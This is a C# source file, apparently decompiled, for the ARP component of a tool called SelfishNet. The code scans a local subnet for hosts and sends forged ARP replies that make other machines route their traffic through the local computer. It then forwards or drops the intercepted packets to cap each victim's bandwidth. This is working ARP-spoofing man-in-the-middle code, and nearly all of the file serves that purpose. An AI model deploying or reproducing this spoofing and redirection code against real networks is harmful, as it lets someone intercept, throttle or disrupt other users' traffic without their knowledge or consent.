using PcapNet;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

using System.Collections.Generic;
using System.Linq;

namespace SelfishNetv0
{
#pragma warning disable CS1591 // Falta el comentario XML para el tipo o miembro visible públicamente
    public class CArp : IDisposable
    {
        private bool isListeningArp;

        private bool isRedirecting;

        private bool isDiscovering;

        private PcList pcList;

        private NetworkInterface nicNet;

        private CPcapNet pcaparp;

        private CPcapNet pcapredirect;

        private Thread arpListenerThread;

        private Thread redirectorThread;

        private Thread discoveringThread;

        private EventWaitHandle arpListenerThreadTerminated;

        private EventWaitHandle redirectorThreadTerminated;

        private EventWaitHandle discovererThreadTerminated;
    
        public byte[] localIP;

        public byte[] localMAC;

        public byte[] netmask;

        public byte[] routerIP;

        public byte[] routerMAC;

        public byte[] broadcastMac;

        private void discoverer()
        {
            isDiscovering = true;
            IPAddress iPAddress = new IPAddress(netmask);
            char[] separator = new char[2]
            {
            '.',
            '\u0003'
            };
            string[] array = iPAddress.ToString().Split(separator);
            int[] array2 = new int[4];
            int num = 0;
            do
            {
                array2[num] = Convert.ToInt32(array[num]);
                num++;
            }
            while (num < 4);
            IPAddress iPAddress2 = new IPAddress(localIP);
            char[] separator2 = new char[2]
            {
            '.',
            '\u0003'
            };
            string[] array3 = iPAddress2.ToString().Split(separator2);
            int[] array4 = new int[4];
            int num2 = 0;
            do
            {
                array4[num2] = Convert.ToInt32(array3[num2]);
                num2++;
            }
            while (num2 < 4);
            int num3 = array2[0];
            int num4 = 256 - num3;
            int num5 = array4[0] / num4 * num4;
            int num6 = (255 - num3) / num4 + num5;
            if (num6 < num5 - num3 + 256)
            {
                int num27;
                do
                {
                    int num7 = array2[1];
                    int num8 = -num7;
                    int num9 = array4[1] / (num8 + 256) * (num8 + 256);
                    int num10 = (num8 + 255) / (num8 + 256) + num9;
                    if (num10 < num9 - num7 + 256)
                    {
                        int num26;
                        do
                        {
                            int num11 = array2[2];
                            int num12 = -num11;
                            int num13 = array4[2] / (num12 + 256) * (num12 + 256);
                            int num14 = (num12 + 255) / (num12 + 256) + num13;
                            if (num14 < num13 - num11 + 256)
                            {
                                int num15 = array4[3];
                                int num16 = array2[3];
                                int num25;
                                do
                                {
                                    int num17 = -num16;
                                    int num18 = num15 / (num17 + 256) * (num17 + 256);
                                    int num19 = (num17 + 255) / (num17 + 256) + num18;
                                    if (num19 < num18 - num16 + 256)
                                    {
                                        int num24;
                                        do
                                        {
                                            if (isDiscovering)
                                            {
                                                string[] array5 = new string[7];
                                                int num20 = num6;
                                                array5[0] = num20.ToString();
                                                array5[1] = ".";
                                                int num21 = num10;
                                                array5[2] = num21.ToString();
                                                array5[3] = ".";
                                                int num22 = num14;
                                                array5[4] = num22.ToString();
                                                array5[5] = ".";
                                                int num23 = num19;
                                                array5[6] = num23.ToString();
                                                string ip = string.Concat(array5);
                                                findMac(ip);
                                                Thread.Sleep(5);
                                                num19++;
                                                num16 = array2[3];
                                                num24 = 256 - num16;
                                                num15 = array4[3];
                                                continue;
                                            }
                                            discovererThreadTerminated.Set();
                                            return;
                                        }
                                        while (num19 < num15 / num24 * num24 - num16 + 256);
                                    }
                                    num14++;
                                    num11 = array2[2];
                                    num25 = 256 - num11;
                                }
                                while (num14 < array4[2] / num25 * num25 - num11 + 256);
                            }
                            num10++;
                            num7 = array2[1];
                            num26 = 256 - num7;
                        }
                        while (num10 < array4[1] / num26 * num26 - num7 + 256);
                    }
                    num6++;
                    num3 = array2[0];
                    num27 = 256 - num3;
                }
                while (num6 < array4[0] / num27 * num27 - num3 + 256);
            }
            isDiscovering = false;
            discovererThreadTerminated.Set();
        }

        private void redirector()
        {
            byte[] pkt_data = null;
            packet_headers pkt_hdr = null;
            isRedirecting = true;
            byte[] array = new byte[6];
            byte[] array2 = new byte[4];
            byte[] array3 = new byte[4];
            PC router = pcList.getRouter();
            if (router != null)
            {
                routerMAC = router.mac.GetAddressBytes();
            }
            if (routerMAC == null)
            {
                MessageBox.Show("No router found to redirect packet");
                isRedirecting = false;
                return;
            }
            if (isRedirecting)
            {
                do
                {
                    if (pcapredirect.pcapnet_next_ex(out pkt_hdr, out pkt_data) == 0)
                    {
                        continue;
                    }
                    Array.Copy(pkt_data, 6, array, 0, 6);
                    if (tools.areValuesEqual(array, localMAC))
                    {
                        Array.Copy(pkt_data, 26, array2, 0, 4);
                        if (tools.areValuesEqual(array2, localIP))
                        {
                            pcList.getLocalPC().nbPacketSentSinceLastReset += (int)pkt_hdr.caplen;
                        }
                        continue;
                    }
                    if (tools.areValuesEqual(array, routerMAC))
                    {
                        Array.Copy(pkt_data, 30, array3, 0, 4);
                        if (tools.areValuesEqual(array3, localIP))
                        {
                            pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)pkt_hdr.caplen;
                            continue;
                        }
                        PC pCFromIP = pcList.getPCFromIP(array3);
                        if (pCFromIP != null)
                        {
                            int capDown = pCFromIP.capDown;
                            if ((capDown == 0 || capDown > pCFromIP.nbPacketReceivedSinceLastReset) && pCFromIP.redirect)
                            {
                                Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, pkt_data, 0, 6);
                                Array.Copy(localMAC, 0, pkt_data, 6, 6);
                                pcapredirect.pcapnet_sendpacket(pkt_data);
                                pCFromIP.nbPacketReceivedSinceLastReset += (int)pkt_hdr.caplen;
                            }
                        }
                        continue;
                    }
                    Array.Copy(pkt_data, 30, array3, 0, 4);
                    if (tools.areValuesEqual(array3, localIP))
                    {
                        continue;
                    }
                    PC pCFromMac = pcList.getPCFromMac(array);
                    if (pCFromMac != null)
                    {
                        int capUp = pCFromMac.capUp;
                        if ((capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect)
                        {
                            Array.Copy(routerMAC, 0, pkt_data, 0, 6);
                            Array.Copy(localMAC, 0, pkt_data, 6, 6);
                            pcapredirect.pcapnet_sendpacket(pkt_data);
                            pCFromMac.nbPacketSentSinceLastReset += (int)pkt_hdr.caplen;
                        }
                    }
                }
                while (isRedirecting);
            }
            redirectorThreadTerminated.Set();
        }

        private void arpListener()
        {
            byte[] pkt_data = null;
            packet_headers pkt_hdr = null;
            isListeningArp = true;
            do
            {
                if (pcaparp.pcapnet_next_ex(out pkt_hdr, out pkt_data) == 0)
                {
                    continue;
                }
                byte[] array = new byte[6];
                Array.Copy(pkt_data, 6, array, 0, 6);
                if (tools.areValuesEqual(array, localMAC))
                {
                    continue;
                }
                byte b = pkt_data[21];
                if (b.ToString().CompareTo("2") == 0)
                {
                    byte[] array2 = new byte[4];
                    byte[] array3 = new byte[6];
                    Array.Copy(pkt_data, 22, array3, 0, 6);
                    Array.Copy(pkt_data, 28, array2, 0, 4);
                    PC pC = new PC();
                    pC.ip = new IPAddress(array2);
                    pC.mac = new PhysicalAddress(array3);
                    pC.capDown = 0;
                    pC.capUp = 0;
                    pC.isLocalPc = false;
                    pC.name = "";
                    pC.nbPacketReceivedSinceLastReset = 0;
                    pC.nbPacketSentSinceLastReset = 0;
                    pC.redirect = true;
                    DateTime now = DateTime.Now;
                    pC.timeSinceLastRarp = now;
                    pC.totalPacketReceived = 0;
                    pC.totalPacketSent = 0;
                    if (tools.areValuesEqual(array2, routerIP))
                    {
                        routerMAC = array;
                        pC.isGateway = true;
                    }
                    else
                    {
                        pC.isGateway = false;
                    }
                    pcList.addPcToList(pC);
                }
            }
            while (isListeningArp);
            arpListenerThreadTerminated.Set();
        }

        public CArp(NetworkInterface nic, PcList pclist)
        {
            pcList = pclist;
            nicNet = nic;
            int num = 0;
            if (0 < nic.GetIPProperties().UnicastAddresses.Count)
            {
                do
                {
                    if (!Convert.ToString(nicNet.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
                    {
                        localIP = nicNet.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
                        netmask = nicNet.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
                    }
                    num++;
                }
                while (num < nicNet.GetIPProperties().UnicastAddresses.Count);
            }
            localMAC = nicNet.GetPhysicalAddress().GetAddressBytes();
            if (nicNet.GetIPProperties().GatewayAddresses.Count > 0)
            {
                routerIP = nicNet.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
            }
            byte[] array = broadcastMac = new byte[6];
            int num2 = 0;
            do
            {
                array[num2] = byte.MaxValue;
                num2++;
            }
            while (num2 < 6);
            pcaparp = new CPcapNet();
            pcapredirect = new CPcapNet();
            arpListenerThreadTerminated = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
            redirectorThreadTerminated = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
            discovererThreadTerminated = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
            isListeningArp = false;
            isDiscovering = false;
            isRedirecting = false;
        }

     public void PCArp()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                discovererThreadTerminated.WaitOne();
            }
            if (isListeningArp)
            {
                isListeningArp = false;
                arpListenerThreadTerminated.WaitOne();
            }
            if (isRedirecting)
            {
                isRedirecting = false;
                redirectorThreadTerminated.WaitOne();
            }
            completeUnspoof();
        }

        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pCFromIP2 != null)
            {
                byte[] array = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), array, 2, array, pCFromIP2.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
                byte[] array2 = localMAC;
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), array2, 2, array2, pCFromIP.ip.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes()));
                pcaparp.pcapnet_sendpacket(buildArpPacket(localMAC, pCFromIP2.mac.GetAddressBytes(), 2, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), localMAC, localIP));
                byte[] array3 = localMAC;
                CPcapNet cPcapNet = pcaparp;
                byte[] array4 = array3;
                cPcapNet.pcapnet_sendpacket(buildArpPacket(array4, array4, 2, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), localMAC, localIP));
            }
        }

        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pCFromIP2 != null)
            {
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), 1, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
                pcaparp.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pCFromIP2.ip.GetAddressBytes()));
            }
        }

        public void findMacRouter()
        {
            findMac(new IPAddress(routerIP).ToString());
        }

        public void findMac(string ip)
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return;
            }
            byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
            byte[] array = broadcastMac;
            byte[] array2 = localMAC;
            pcaparp.pcapnet_sendpacket(buildArpPacket(array, array2, 1, array2, localIP, array, addressBytes));
        }

        public int startRedirector()
        {
            string text = null;
            if (pcapredirect.nicHandle == IntPtr.Zero && !pcapredirect.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!isRedirecting)
            {
                (redirectorThread = new Thread(redirector)).Start();
            }
            return 0;
        }

        public void stopRedirector()
        {
            if (isRedirecting)
            {
                isRedirecting = false;
                redirectorThreadTerminated.WaitOne();
            }
        }

        public int startArpListener()
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (pcaparp.pcapnet_setFilter("arp", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!isListeningArp)
            {
                (arpListenerThread = new Thread(arpListener)).Start();
            }
            return 0;
        }

        public void stopArpListener()
        {
            if (isListeningArp)
            {
                isListeningArp = false;
                arpListenerThreadTerminated.WaitOne();
            }
        }

        public int startArpDiscovery()
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (!isDiscovering)
            {
                (discoveringThread = new Thread(discoverer)).Start();
            }
            return 0;
        }

        public void stopArpDiscovery()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                discovererThreadTerminated.WaitOne();
            }
        }

        public void completeUnspoof()
        {
            PC router = pcList.getRouter();
            if (router == null)
            {
                return;
            }
            int num = 0;
            if (0 < pcList.pclist.Count)
            {
                do
                {
                    UnSpoof(((PC)pcList.pclist[num]).ip, router.ip);
                    num++;
                }
                while (num < pcList.pclist.Count);
            }
        }

        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
        {
            byte[] array = new byte[42];
            Array.Copy(destMac, 0, array, 0, 6);
            Array.Copy(srcMac, 0, array, 6, 6);
            array[12] = 8;
            array[13] = 6;
            array[14] = 0;
            array[15] = 1;
            array[16] = 8;
            array[17] = 0;
            array[18] = 6;
            array[19] = 4;
            array[20] = 0;
            array[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, array, 22, 6);
            Array.Copy(arpSrcIp, 0, array, 28, 4);
            Array.Copy(arpDestMac, 0, array, 32, 6);
            Array.Copy(arpDestIP, 0, array, 38, 4);
            return array;
        }

        protected virtual void Dispose([MarshalAs(UnmanagedType.U1)] bool P_0)
        {
            if (P_0)
            {
                PCArp();
            }
            else
            {
                
            }
        }

        public  void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
#pragma warning restore CS1591 // Falta el comentario XML para el tipo o miembro visible públicamente
}
